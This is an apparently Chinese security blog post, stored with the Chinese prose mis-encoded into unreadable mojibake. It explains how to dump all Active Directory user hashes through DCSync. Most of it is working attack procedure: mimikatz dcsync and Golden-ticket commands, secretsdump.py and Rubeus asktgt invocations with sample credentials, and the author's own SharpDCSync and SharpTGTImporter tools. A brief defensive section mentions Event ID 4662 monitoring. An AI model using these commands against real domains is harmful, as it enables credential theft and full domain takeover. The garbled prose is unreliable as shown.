I"Œ<h2 id="0x00-å‰è¨€">0x00 å‰è¨€</h2>
<hr />

<p>åœ¨ä¹‹å‰çš„æ–‡ç« <a href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync">ã€ŠåŸŸæ¸—é€â€”â€”DCSyncã€‹</a>æ›¾ç³»ç»Ÿçš„æ•´ç†è¿‡DCSyncçš„åˆ©ç”¨æ–¹æ³•ï¼Œæœ¬æ–‡å°†è¦é’ˆå¯¹åˆ©ç”¨DCSyncå¯¼å‡ºåŸŸå†…æ‰€æœ‰ç”¨æˆ·hashè¿™ä¸€æ–¹æ³•è¿›è¡Œè¯¦ç»†ä»‹ç»ï¼Œåˆ†æä¸åŒç¯å¢ƒä¸‹çš„åˆ©ç”¨æ€è·¯ï¼Œç»™å‡ºé˜²å¾¡å»ºè®®ã€‚</p>

<h2 id="0x01-ç®€ä»‹">0x01 ç®€ä»‹</h2>
<hr />

<p>æœ¬æ–‡å°†è¦ä»‹ç»ä»¥ä¸‹å†…å®¹ï¼š</p>

<ul>
  <li>åˆ©ç”¨æ¡ä»¶</li>
  <li>åˆ©ç”¨å·¥å…·</li>
  <li>åˆ©ç”¨æ€è·¯</li>
  <li>é˜²å¾¡å»ºè®®</li>
</ul>

<h2 id="0x02-åˆ©ç”¨æ¡ä»¶">0x02 åˆ©ç”¨æ¡ä»¶</h2>
<hr />

<p>è·å¾—ä»¥ä¸‹ä»»ä¸€ç”¨æˆ·çš„æƒé™ï¼š</p>

<ul>
  <li>Administratorsç»„å†…çš„ç”¨æˆ·</li>
  <li>Domain Adminsç»„å†…çš„ç”¨æˆ·</li>
  <li>Enterprise Adminsç»„å†…çš„ç”¨æˆ·</li>
  <li>åŸŸæ§åˆ¶å™¨çš„è®¡ç®—æœºå¸æˆ·</li>
</ul>

<h2 id="0x03-åˆ©ç”¨å·¥å…·">0x03 åˆ©ç”¨å·¥å…·</h2>
<hr />

<h3 id="1cå®ç°mimikatz">1.Cå®ç°(<a href="https://github.com/gentilkiwi/mimikatz">mimikatz</a>)</h3>

<p>å®ç°ä»£ç ï¼š</p>

<p>https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/lsadump/kuhl_m_lsadump_dc.c#L27</p>

<p>ç¤ºä¾‹å‘½ä»¤ï¼š</p>

<h4 id="1å¯¼å‡ºåŸŸå†…æ‰€æœ‰ç”¨æˆ·çš„hash">(1)å¯¼å‡ºåŸŸå†…æ‰€æœ‰ç”¨æˆ·çš„hash</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz.exe "lsadump::dcsync /domain:test.com /all /csv" exit
</code></pre></div></div>

<h4 id="2å¯¼å‡ºåŸŸå†…administratorå¸æˆ·çš„hash">(2)å¯¼å‡ºåŸŸå†…administratorå¸æˆ·çš„hash</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz.exe "lsadump::dcsync /domain:test.com /user:administrator /csv" exit
</code></pre></div></div>

<h3 id="2pythonå®ç°secretsdumppy">2.Pythonå®ç°(<a href="https://github.com/SecureAuthCorp/impacket/blob/master/impacket/examples/secretsdump.py">secretsdump.py</a>)</h3>

<p>ç¤ºä¾‹å‘½ä»¤ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python secretsdump.py test/Administrator:DomainAdmin123!@192.168.1.1
</code></pre></div></div>

<h3 id="3powershellå®ç°makemeenterpriseadmin">3.Powershellå®ç°(<a href="https://github.com/vletoux/MakeMeEnterpriseAdmin">MakeMeEnterpriseAdmin</a>)</h3>

<p>æ ¸å¿ƒä»£ç ä½¿ç”¨C Sharpå®ç°ï¼Œæ”¯æŒä»¥ä¸‹ä¸‰ä¸ªåŠŸèƒ½ï¼š</p>

<ul>
  <li>é€šè¿‡DCSyncå¯¼å‡ºkrbtgtç”¨æˆ·çš„hash</li>
  <li>ä½¿ç”¨krbtgtç”¨æˆ·çš„hashç”ŸæˆGolden ticket</li>
  <li>å¯¼å…¥Golden ticket</li>
</ul>

<p><strong>æ³¨ï¼š</strong></p>

<p>æˆ‘åœ¨æµ‹è¯•ç¯å¢ƒä¸‹å®éªŒç»“æœæ˜¾ç¤ºï¼Œç”ŸæˆGolden ticketçš„åŠŸèƒ½å­˜åœ¨bugï¼Œå¯¼å…¥Golden ticketåæ— æ³•è·å¾—å¯¹åº”çš„æƒé™</p>

<h3 id="4c-sharpå®ç°">4.C Sharpå®ç°</h3>

<p>æˆ‘åœ¨(<a href="https://github.com/vletoux/MakeMeEnterpriseAdmin">MakeMeEnterpriseAdmin</a>)çš„åŸºç¡€ä¸Šåšäº†ä»¥ä¸‹ä¿®æ”¹ï¼š</p>

<ul>
  <li>æ”¯æŒå¯¼å‡ºæ‰€æœ‰ç”¨æˆ·hash</li>
  <li>å¯¼å‡ºåŸŸsid</li>
  <li>å¯¼å‡ºæ‰€æœ‰åŸŸç”¨æˆ·sid</li>
</ul>

<p>ä»£ç å·²ä¸Šä¼ è‡³githubï¼Œåœ°å€å¦‚ä¸‹ï¼š</p>

<p>https://github.com/3gstudent/Homework-of-C-Sharp/blob/master/SharpDCSync.cs</p>

<h4 id="è¡¥å……ä»£ç å¼€å‘ç»†èŠ‚">è¡¥å……ï¼šä»£ç å¼€å‘ç»†èŠ‚</h4>

<p>è¾“å‡ºDictionaryä¸­æ‰€æœ‰çš„é”®å’Œå€¼ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>foreach(string key in values.Keys)
{
    Console.WriteLine(string.Format("key:{0} value{1}", key, values[key]));
}
</code></pre></div></div>

<p>byteæ•°ç»„è½¬stringï¼Œç”¨æ¥è¾“å‡ºhashï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>byte[] data = values["ATT_UNICODE_PWD"] as byte[];
Console.WriteLine(BitConverter.ToString(data).Replace("-",""));
</code></pre></div></div>

<p>stringè½¬byteæ•°ç»„ï¼Œç”¨æ¥å°†hashè½¬æ¢æˆbyteæ•°ç»„ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>string hex = "D4FE97B4FD50367C7AE8FEF781F27A2E";
var inputByteArray = new byte[hex.Length / 2];
for (var x = 0; x &lt; inputByteArray.Length; x++)
{
    var i = Convert.ToInt32(hex.Substring(x * 2, 2), 16);
    inputByteArray[x] = (byte)i;
}
</code></pre></div></div>

<h2 id="0x04-åˆ©ç”¨æ€è·¯">0x04 åˆ©ç”¨æ€è·¯</h2>
<hr />

<h3 id="1åœ¨åŸŸæ§åˆ¶å™¨ä¸Šæ‰§è¡Œ">1.åœ¨åŸŸæ§åˆ¶å™¨ä¸Šæ‰§è¡Œ</h3>

<p>0x03ä¸­æåˆ°çš„å·¥å…·å‡å¯ä»¥</p>

<h3 id="2åœ¨åŸŸå†…ä¸»æœºä¸Šæ‰§è¡Œ">2.åœ¨åŸŸå†…ä¸»æœºä¸Šæ‰§è¡Œ</h3>

<h4 id="1mimikatz">(1)Mimikatz</h4>

<p>æœ‰ä»¥ä¸‹ä¸¤ç§åˆ©ç”¨æ€è·¯ï¼š</p>

<ul>
  <li>å¯¼å…¥ç¥¨æ®ï¼Œæ‰§è¡ŒDCSync</li>
  <li>åˆ©ç”¨Over pass the hashå¯åŠ¨è„šæœ¬ï¼Œè„šæœ¬æ‰§è¡ŒDCSync</li>
</ul>

<h4 id="2secretsdumppy">(2)secretsdump.py</h4>

<p>ç›´æ¥æ‰§è¡Œå³å¯</p>

<h4 id="3c-sharpå®ç°">(3)C Sharpå®ç°</h4>

<p>é¦–å…ˆéœ€è¦ç”Ÿæˆç¥¨æ®</p>

<p>æœ‰ä»¥ä¸‹ä¸¤ç§åˆ©ç”¨æ€è·¯ï¼š</p>

<ol>
  <li>æ‹¿åˆ°krbtgtç”¨æˆ·çš„hashï¼Œåœ¨æœ¬åœ°ä½¿ç”¨Mimikatzç”ŸæˆGolden ticket</li>
</ol>

<p>å‘½ä»¤ç¤ºä¾‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz "kerberos::golden /user:Administrator /domain:TEST.COM /sid:S-1-5-21-254706111-4049838133-2416123456 /krbtgt:D4FE97B4FD50367C7AE8FEF781F27A2E /ticket:test.kirbi"
</code></pre></div></div>

<ol>
  <li>æ‹¿åˆ°é«˜æƒé™ç”¨æˆ·ï¼Œä½¿ç”¨<a href="https://github.com/GhostPack/Rubeus">Rubeus</a>å‘é€è¯·æ±‚è·å¾—ticket</li>
</ol>

<p>å‘½ä»¤ç¤ºä¾‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Rubeus.exe asktgt /user:administrator /password:123456 /outfile:test.kirbi
Rubeus.exe asktgt /user:administrator /rc4:D4FE97B4FD50367C7AE8FEF781F27A2E /outfile:test.kirbi
</code></pre></div></div>

<p>æ¥ç€å¯¼å…¥ç¥¨æ®</p>

<p>å¯ä»¥é€‰æ‹©SharpTGTImporter.csï¼Œä»£ç å·²ä¸Šä¼ è‡³githubï¼Œåœ°å€å¦‚ä¸‹ï¼š</p>

<p>https://github.com/3gstudent/Homework-of-C-Sharp/blob/master/SharpDCSync.cs</p>

<p>æˆ‘åœ¨(<a href="https://github.com/vletoux/MakeMeEnterpriseAdmin">MakeMeEnterpriseAdmin</a>)çš„åŸºç¡€ä¸Šåšäº†ä»¥ä¸‹ä¿®æ”¹ï¼š</p>

<ul>
  <li>æ”¯æŒå¯¼å…¥æŒ‡å®šç¥¨æ®æ–‡ä»¶</li>
</ul>

<p>å‘½ä»¤ç¤ºä¾‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SharpTGTImporter.exe test.kirbi
</code></pre></div></div>

<p>æœ€åæ‰§è¡ŒDCSync</p>

<p>å¯¼å‡ºæ‰€æœ‰ç”¨æˆ·hashå¯ä»¥é€‰æ‹©SharpDCSync.csï¼Œä»£ç å·²ä¸Šä¼ è‡³githubï¼Œåœ°å€å¦‚ä¸‹ï¼š</p>

<p>https://github.com/3gstudent/Homework-of-C-Sharp/blob/master/SharpDCSync.cs</p>

<p>å‘½ä»¤ç¤ºä¾‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SharpDCSync.exe dc1.test.com TEST.COM
</code></pre></div></div>

<p>å¯¼å‡ºkrbtgtç”¨æˆ·hashå¯ä»¥é€‰æ‹©SharpDCSync_krbtgt.csï¼Œä»£ç å·²ä¸Šä¼ è‡³githubï¼Œåœ°å€å¦‚ä¸‹ï¼š</p>

<p>https://github.com/3gstudent/Homework-of-C-Sharp/blob/master/SharpDCSync_krbtgt.cs</p>

<p>å‘½ä»¤ç¤ºä¾‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SharpDCSync_krbtgt.exe dc1.test.com TEST.COM
</code></pre></div></div>

<h3 id="3åœ¨åŸŸå¤–ä¸»æœºä¸Šæ‰§è¡Œ">3.åœ¨åŸŸå¤–ä¸»æœºä¸Šæ‰§è¡Œ</h3>

<p>æ–¹æ³•åŒâ€œ2.åœ¨åŸŸå†…ä¸»æœºä¸Šæ‰§è¡Œâ€</p>

<h2 id="0x05-é˜²å¾¡å»ºè®®">0x05 é˜²å¾¡å»ºè®®</h2>
<hr />

<p>æ”»å‡»è€…éœ€è¦ä»¥ä¸‹ä»»ä¸€ç”¨æˆ·çš„æƒé™ï¼š</p>

<ul>
  <li>Administratorsç»„å†…çš„ç”¨æˆ·</li>
  <li>Domain Adminsç»„å†…çš„ç”¨æˆ·</li>
  <li>Enterprise Adminsç»„å†…çš„ç”¨æˆ·</li>
  <li>åŸŸæ§åˆ¶å™¨çš„è®¡ç®—æœºå¸æˆ·</li>
</ul>

<p>é€šè¿‡äº‹ä»¶æ—¥å¿—æ£€æµ‹å¯ä»¥é€‰æ‹©ç›‘æ§æ—¥å¿—Event ID 4662</p>

<p>å‚è€ƒèµ„æ–™ï¼š</p>

<p>https://www.blacklanternsecurity.com/2020-12-04-DCSync/</p>

<h2 id="0x06-å°ç»“">0x06 å°ç»“</h2>
<hr />

<p>æœ¬æ–‡ä»‹ç»äº†åˆ©ç”¨DCSyncå¯¼å‡ºåŸŸå†…æ‰€æœ‰ç”¨æˆ·hashçš„æ–¹æ³•ï¼Œåœ¨(<a href="https://github.com/vletoux/MakeMeEnterpriseAdmin">MakeMeEnterpriseAdmin</a>)çš„åŸºç¡€ä¸Šç¼–å†™ä»£ç SharpTGTImporter.cså’ŒSharpDCSync.csï¼Œä¾¿äºåˆ©ç”¨ï¼Œç»“åˆåˆ©ç”¨æ€è·¯ï¼Œç»™å‡ºé˜²å¾¡å»ºè®®ã€‚</p>

<hr />

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>

:ET